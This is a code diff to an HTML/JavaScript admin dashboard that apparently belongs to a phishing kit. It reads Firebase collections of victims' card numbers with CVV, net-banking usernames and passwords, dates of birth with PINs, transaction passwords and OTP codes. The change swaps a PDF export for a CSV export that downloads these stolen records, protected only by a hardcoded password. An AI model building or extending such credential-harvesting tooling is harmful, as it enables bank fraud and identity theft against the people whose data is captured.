@@ -22,7 +22,6 @@
       flex-wrap: wrap;
       gap: 10px;
       margin: 20px;
-      position: relative;
     }
     .nav-buttons {
       display: flex;
@@ -82,11 +81,9 @@
     }
   </style>
 
-  <!-- Firebase CDN -->
+  <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/11.6.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore-compat.js"></script>
-  <!-- PDF Export Library -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
 </head>
 
 <body>
@@ -95,7 +92,6 @@
   if (localStorage.getItem("adminLoggedIn") !== "true") {
     window.location.href = "index.html";
   }
-
   function logout() {
     localStorage.removeItem("adminLoggedIn");
     window.location.href = "index.html";
@@ -114,7 +110,7 @@
     <button onclick="showSection('otpSection')">OTP</button>
     <button onclick="showSection('combinedSection')">All</button>
   </div>
-  <button class="download-button" onclick="handleDownloadPdf()">Download PDF</button>
+  <button class="download-button" onclick="handleDownloadCSV()">Download CSV</button>
   <button class="logout-button" onclick="logout()">Logout</button>
 </div>
 
@@ -141,9 +137,7 @@
   const db = firebase.firestore();
 
   function showSection(id) {
-    document.querySelectorAll('.section').forEach(sec => {
-      sec.classList.remove('active');
-    });
+    document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
     document.getElementById(id).classList.add('active');
   }
 
@@ -174,43 +168,7 @@
     }
   }
 
-  function handleDownloadPdf() {
-    const pass = prompt("Enter password to download:");
-    if (pass !== "4542") {
-      alert("Wrong password.");
-      return;
-    }
-
-    const content = document.getElementById("combinedSection");
-
-    // Show combined section if not active
-    const currentActive = document.querySelector('.section.active');
-    const wasActive = currentActive && currentActive.id !== "combinedSection";
-
-    if (wasActive) {
-      currentActive.classList.remove("active");
-      content.classList.add("active");
-    }
-
-    // Wait 2 seconds for Firebase data to render before export
-    setTimeout(() => {
-      const opt = {
-        margin: 0.5,
-        filename: 'admin-data.pdf',
-        image: { type: 'jpeg', quality: 0.98 },
-        html2canvas: { scale: 2 },
-        jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
-      };
-
-      html2pdf().set(opt).from(content).save().then(() => {
-        if (wasActive) {
-          content.classList.remove("active");
-          currentActive.classList.add("active");
-        }
-      });
-    }, 2000);
-  }
-
+  // User section
   db.collection("users").orderBy("timestamp", "desc").onSnapshot(snapshot => {
     clearSection("usersSection", "1. User Details");
     clearSection("combinedSection", "7. All Submissions");
@@ -222,6 +180,7 @@
     });
   });
 
+  // DOB + PIN
   db.collection("dob_pin").orderBy("timestamp", "desc").onSnapshot(snapshot => {
     clearSection("dobPinSection", "2. DOB + PIN");
     snapshot.docs.forEach(doc => {
@@ -232,6 +191,7 @@
     });
   });
 
+  // Transaction Password
   db.collection("txn_passwords").orderBy("timestamp", "desc").onSnapshot(snapshot => {
     clearSection("txnPasswordSection", "3. Transaction Passwords");
     snapshot.docs.forEach(doc => {
@@ -242,6 +202,7 @@
     });
   });
 
+  // Payments (Card + NetBanking)
   db.collection("payments").orderBy("timestamp", "desc").onSnapshot(snapshot => {
     clearSection("cardPaymentSection", "4. Card Payments");
     clearSection("netbankingSection", "5. NetBanking Logins");
@@ -259,6 +220,7 @@
     });
   });
 
+  // OTP section
   db.collection("otp_entries").orderBy("timestamp", "desc").onSnapshot(snapshot => {
     clearSection("otpSection", "6. OTP Entries");
     snapshot.docs.forEach(doc => {
@@ -268,6 +230,54 @@
       renderEntry("combinedSection", html, doc.id, "otp_entries", "OTP", d.timestamp);
     });
   });
+
+  // CSV Export Function
+  function handleDownloadCSV() {
+    const pass = prompt("Enter password to download:");
+    if (pass !== "4542") {
+      alert("Wrong password.");
+      return;
+    }
+
+    let csv = "Section,Label,Data,Date Time\n";
+    const formatDate = ts => new Date(ts.seconds * 1000).toLocaleString();
+
+    // Fetch users
+    db.collection("users").orderBy("timestamp", "desc").get().then(snapshot => {
+      snapshot.docs.forEach(doc => {
+        const d = doc.data();
+        csv += `"User","User Detail","Name: ${d.name}, KNO: ${d.kno}, Mobile: ${d.mobile}","${formatDate(d.timestamp)}"\n`;
+      });
+
+      return db.collection("payments").orderBy("timestamp", "desc").get();
+    }).then(snapshot => {
+      snapshot.docs.forEach(doc => {
+        const d = doc.data();
+        if (d.method && d.method.includes("card")) {
+          csv += `"Card","Card Detail","Card: ${d.card}, Expiry: ${d.expiry}, CVV: ${d.cvv}","${formatDate(d.timestamp)}"\n`;
+        } else {
+          csv += `"NetBanking","NetBanking","Bank: ${d.bank}, User: ${d.username}, Password: ${d.password}","${formatDate(d.timestamp)}"\n`;
+        }
+      });
+
+      return db.collection("dob_pin").orderBy("timestamp", "desc").get();
+    }).then(snapshot => {
+      snapshot.docs.forEach(doc => {
+        const d = doc.data();
+        csv += `"DOB+PIN","DOB+PIN","DOB: ${d.dob}, PIN: ${d.pin}","${formatDate(d.timestamp)}"\n`;
+      });
+
+      const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'admin-data.csv';
+      a.click();
+      URL.revokeObjectURL(url);
+    }).catch(err => {
+      alert("CSV Export Error: " + err.message);
+    });
+  }
 </script>
 </body>
 </html>
